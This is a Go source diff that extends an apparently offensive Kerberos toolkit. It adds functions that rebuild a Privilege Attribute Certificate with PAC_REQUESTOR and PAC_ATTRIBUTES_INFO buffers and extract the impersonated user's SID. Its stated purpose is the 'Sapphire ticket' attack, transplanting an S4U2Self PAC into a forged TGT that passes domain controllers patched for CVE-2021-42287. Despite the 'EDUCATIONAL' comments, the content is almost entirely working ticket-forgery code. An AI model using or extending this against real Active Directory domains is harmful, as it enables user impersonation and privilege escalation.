@@ -285,6 +285,15 @@ func DebugPAC(data []byte) {
 				}
 			}
 		}
+
+		// Show first bytes of each buffer for debugging
+		if len(buf.Data) > 0 {
+			showLen := 16
+			if len(buf.Data) < showLen {
+				showLen = len(buf.Data)
+			}
+			fmt.Printf("       Data[:%d]: %x\n", showLen, buf.Data[:showLen])
+		}
 	}
 }
 
@@ -407,4 +416,292 @@ func ReplacePACInAuthData(authData []byte, newPAC []byte) ([]byte, error) {
 	copy(result[offset+newLen:], authData[offset+oldLen:])
 
 	return result, nil
+}
+
+// AddKB5008380Buffers adds PAC_REQUESTOR (type 18) and PAC_ATTRIBUTES_INFO (type 17) buffers to a PAC.
+// These buffers are required by KB5008380 patched Domain Controllers (enforcement since July 2022).
+//
+// EDUCATIONAL: KB5008380 (CVE-2021-42287)
+//
+// This security update addresses PAC spoofing vulnerabilities by requiring:
+// - PAC_REQUESTOR: Contains the SID of the user who originally requested the ticket
+// - PAC_ATTRIBUTES_INFO: Contains flags indicating the PAC's attributes
+//
+// S4U2Self service tickets don't have these buffers, so we must add them when
+// transplanting the PAC into a TGT for the Sapphire ticket attack.
+//
+// Parameters:
+//   - pacData: Raw PAC bytes from S4U2Self ticket
+//   - userSID: The SID of the impersonated user (must match PAC_LOGON_INFO)
+//
+// Returns the modified PAC with the new buffers added.
+func AddKB5008380Buffers(pacData []byte, userSID *SID) ([]byte, error) {
+	pac, err := ParsePACForSigning(pacData)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse PAC: %w", err)
+	}
+
+	// Check if buffers already exist
+	hasRequestor := false
+	hasAttributes := false
+	for _, buf := range pac.Buffers {
+		if buf.Type == RequestorType {
+			hasRequestor = true
+		}
+		if buf.Type == AttributesType {
+			hasAttributes = true
+		}
+	}
+
+	if hasRequestor && hasAttributes {
+		// Already has the required buffers
+		return pacData, nil
+	}
+
+	// Build new buffer data
+	var requestorData, attributesData []byte
+
+	if !hasRequestor && userSID != nil {
+		// PAC_REQUESTOR is just the raw SID bytes
+		requestorData = userSID.Bytes()
+	}
+
+	if !hasAttributes {
+		// PAC_ATTRIBUTES_INFO: FlagsLength (4 bytes) + Flags (4 bytes)
+		// Flags: 0x00000002 = PAC_WAS_REQUESTED
+		attributesData = make([]byte, 8)
+		binary.LittleEndian.PutUint32(attributesData[0:4], 32)         // FlagsLength in bits
+		binary.LittleEndian.PutUint32(attributesData[4:8], 0x00000002) // PAC_WAS_REQUESTED
+	}
+
+	// Calculate how much space we need to add
+	newBufferCount := len(pac.Buffers)
+	extraHeaderSpace := 0
+	extraDataSpace := 0
+
+	if len(requestorData) > 0 {
+		newBufferCount++
+		extraHeaderSpace += 16 // PAC_INFO_BUFFER size
+		extraDataSpace += len(requestorData)
+		extraDataSpace = (extraDataSpace + 7) &^ 7 // Align to 8
+	}
+	if len(attributesData) > 0 {
+		newBufferCount++
+		extraHeaderSpace += 16
+		extraDataSpace += len(attributesData)
+		extraDataSpace = (extraDataSpace + 7) &^ 7
+	}
+
+	if extraHeaderSpace == 0 {
+		return pacData, nil
+	}
+
+	// Rebuild the PAC with new buffers
+	// New structure: header + all buffer headers + all buffer data
+	newHeaderSize := 8 + newBufferCount*16
+	oldHeaderSize := 8 + len(pac.Buffers)*16
+
+	// Calculate total size after adding buffers
+	// We need to shift all existing data offsets by the extra header space
+	newPACSize := len(pacData) + extraHeaderSpace + extraDataSpace
+
+	newPAC := make([]byte, newPACSize)
+
+	// Write new header
+	binary.LittleEndian.PutUint32(newPAC[0:4], uint32(newBufferCount))
+	binary.LittleEndian.PutUint32(newPAC[4:8], 0) // Version
+
+	// Copy existing buffer headers with adjusted offsets
+	headerPos := 8
+	for _, buf := range pac.Buffers {
+		binary.LittleEndian.PutUint32(newPAC[headerPos:headerPos+4], buf.Type)
+		binary.LittleEndian.PutUint32(newPAC[headerPos+4:headerPos+8], buf.Size)
+		// Adjust offset by the extra header space
+		newOffset := buf.Offset + uint64(extraHeaderSpace)
+		binary.LittleEndian.PutUint64(newPAC[headerPos+8:headerPos+16], newOffset)
+		headerPos += 16
+	}
+
+	// Add new buffer headers
+	dataPos := len(pacData) + extraHeaderSpace // New data starts after old data (shifted)
+
+	if len(attributesData) > 0 {
+		binary.LittleEndian.PutUint32(newPAC[headerPos:headerPos+4], AttributesType)
+		binary.LittleEndian.PutUint32(newPAC[headerPos+4:headerPos+8], uint32(len(attributesData)))
+		binary.LittleEndian.PutUint64(newPAC[headerPos+8:headerPos+16], uint64(dataPos))
+		headerPos += 16
+		// Write attributes data later
+	}
+
+	if len(requestorData) > 0 {
+		attrDataSize := 0
+		if len(attributesData) > 0 {
+			attrDataSize = (len(attributesData) + 7) &^ 7
+		}
+		binary.LittleEndian.PutUint32(newPAC[headerPos:headerPos+4], RequestorType)
+		binary.LittleEndian.PutUint32(newPAC[headerPos+4:headerPos+8], uint32(len(requestorData)))
+		binary.LittleEndian.PutUint64(newPAC[headerPos+8:headerPos+16], uint64(dataPos+attrDataSize))
+		headerPos += 16
+	}
+
+	// Copy existing buffer data (shifted by extra header space)
+	copy(newPAC[newHeaderSize:], pacData[oldHeaderSize:])
+
+	// Append new buffer data
+	dataWritePos := len(pacData) + extraHeaderSpace
+	if len(attributesData) > 0 {
+		copy(newPAC[dataWritePos:], attributesData)
+		dataWritePos += (len(attributesData) + 7) &^ 7
+	}
+	if len(requestorData) > 0 {
+		copy(newPAC[dataWritePos:], requestorData)
+	}
+
+	fmt.Printf("[DEBUG] AddKB5008380Buffers: added %d new buffers, PAC size %d -> %d\n",
+		newBufferCount-len(pac.Buffers), len(pacData), len(newPAC))
+
+	return newPAC, nil
+}
+
+// ExtractUserSIDFromPAC extracts the user SID from PAC_LOGON_INFO buffer.
+// This is used to get the impersonated user's SID for PAC_REQUESTOR.
+//
+// EDUCATIONAL: User SID Construction
+// In KERB_VALIDATION_INFO:
+// - LogonDomainId = Domain SID (e.g., S-1-5-21-xxx-xxx-xxx) - 4 sub-authorities
+// - User SID = Domain SID + User RID (e.g., S-1-5-21-xxx-xxx-xxx-1115) - 5 sub-authorities
+//
+// We search for a 5-subauthority SID directly in the data, which is the user SID.
+func ExtractUserSIDFromPAC(pacData []byte) (*SID, error) {
+	pac, err := ParsePACForSigning(pacData)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse PAC: %w", err)
+	}
+
+	// Find LOGON_INFO buffer
+	logonBuf := pac.GetBuffer(LogonInfoType)
+	if logonBuf == nil {
+		return nil, fmt.Errorf("PAC has no LOGON_INFO buffer")
+	}
+
+	data := logonBuf.Data
+	if len(data) < 100 {
+		return nil, fmt.Errorf("LOGON_INFO too short")
+	}
+
+	// Strategy 1: Search for a 5-subauthority SID (the full user SID)
+	// This is more reliable than parsing NDR offsets
+	for i := 0; i < len(data)-28; i++ {
+		// Look for: Revision=1, NumSubAuth=5, Authority=5 (NT)
+		if data[i] == 0x01 && data[i+1] == 0x05 { // User SID has 5 sub-authorities
+			if data[i+2] == 0 && data[i+3] == 0 && data[i+4] == 0 && data[i+5] == 0 && data[i+6] == 0 && data[i+7] == 5 {
+				// Found potential user SID (S-1-5-...)
+				if i+28 <= len(data) {
+					sub0 := binary.LittleEndian.Uint32(data[i+8:])
+					if sub0 == 21 { // Verify it starts with 21 (domain SID pattern)
+						// Get the last sub-authority (user RID)
+						userRID := binary.LittleEndian.Uint32(data[i+24:])
+						// Validate RID is reasonable (500+ for built-in, 1000+ for regular)
+						if userRID >= 500 && userRID < 100000 {
+							userSID := &SID{
+								Revision:          data[i],
+								NumSubAuthorities: data[i+1],
+							}
+							copy(userSID.Authority[:], data[i+2:i+8])
+							userSID.SubAuthorities = make([]uint32, 5)
+							for j := 0; j < 5; j++ {
+								userSID.SubAuthorities[j] = binary.LittleEndian.Uint32(data[i+8+j*4:])
+							}
+							fmt.Printf("[DEBUG] Found user SID directly: %s (RID=%d)\n", userSID.String(), userRID)
+							return userSID, nil
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// Strategy 2: Fall back to finding domain SID and searching for RID nearby
+	fmt.Println("[DEBUG] No direct user SID found, trying domain SID + RID approach...")
+
+	var domainSID *SID
+	var domainSIDOffset int
+
+	// Search for domain SID (4 sub-authorities)
+	for i := 0; i < len(data)-24; i++ {
+		if data[i] == 0x01 && data[i+1] == 0x04 { // Domain SID has 4 sub-authorities
+			if data[i+2] == 0 && data[i+3] == 0 && data[i+4] == 0 && data[i+5] == 0 && data[i+6] == 0 && data[i+7] == 5 {
+				if i+24 <= len(data) {
+					sub0 := binary.LittleEndian.Uint32(data[i+8:])
+					if sub0 == 21 {
+						domainSID = &SID{
+							Revision:          data[i],
+							NumSubAuthorities: data[i+1],
+						}
+						copy(domainSID.Authority[:], data[i+2:i+8])
+						domainSID.SubAuthorities = make([]uint32, 4)
+						for j := 0; j < 4; j++ {
+							domainSID.SubAuthorities[j] = binary.LittleEndian.Uint32(data[i+8+j*4:])
+						}
+						domainSIDOffset = i
+						fmt.Printf("[DEBUG] Found domain SID at offset %d: %s\n", i, domainSID.String())
+						break
+					}
+				}
+			}
+		}
+	}
+
+	if domainSID == nil {
+		return nil, fmt.Errorf("could not find domain SID in LOGON_INFO")
+	}
+
+	// Look for user RID immediately after domain SID (common pattern)
+	// Or search backwards from domain SID for the UserId field
+	var userRID uint32
+
+	// Check bytes right after the domain SID
+	afterSID := domainSIDOffset + 24
+	if afterSID+4 <= len(data) {
+		candidateRID := binary.LittleEndian.Uint32(data[afterSID:])
+		if candidateRID >= 500 && candidateRID < 100000 {
+			userRID = candidateRID
+			fmt.Printf("[DEBUG] Found RID after domain SID: %d\n", userRID)
+		}
+	}
+
+	// Also search for PrimaryGroupId (513 = Domain Users) and look for UserId before it
+	if userRID == 0 {
+		for i := 0; i < len(data)-8; i++ {
+			pgid := binary.LittleEndian.Uint32(data[i:])
+			if pgid == 513 { // Domain Users
+				// UserId is typically right before PrimaryGroupId
+				if i >= 4 {
+					candidateRID := binary.LittleEndian.Uint32(data[i-4:])
+					if candidateRID >= 500 && candidateRID < 100000 {
+						userRID = candidateRID
+						fmt.Printf("[DEBUG] Found RID before PrimaryGroupId: %d\n", userRID)
+						break
+					}
+				}
+			}
+		}
+	}
+
+	if userRID == 0 {
+		return nil, fmt.Errorf("could not find user RID in LOGON_INFO")
+	}
+
+	// Build user SID = domain SID + user RID
+	userSID := &SID{
+		Revision:          domainSID.Revision,
+		NumSubAuthorities: domainSID.NumSubAuthorities + 1,
+		Authority:         domainSID.Authority,
+		SubAuthorities:    make([]uint32, len(domainSID.SubAuthorities)+1),
+	}
+	copy(userSID.SubAuthorities, domainSID.SubAuthorities)
+	userSID.SubAuthorities[len(domainSID.SubAuthorities)] = userRID
+
+	fmt.Printf("[DEBUG] Constructed user SID: %s (domain + RID %d)\n", userSID.String(), userRID)
+	return userSID, nil
 }
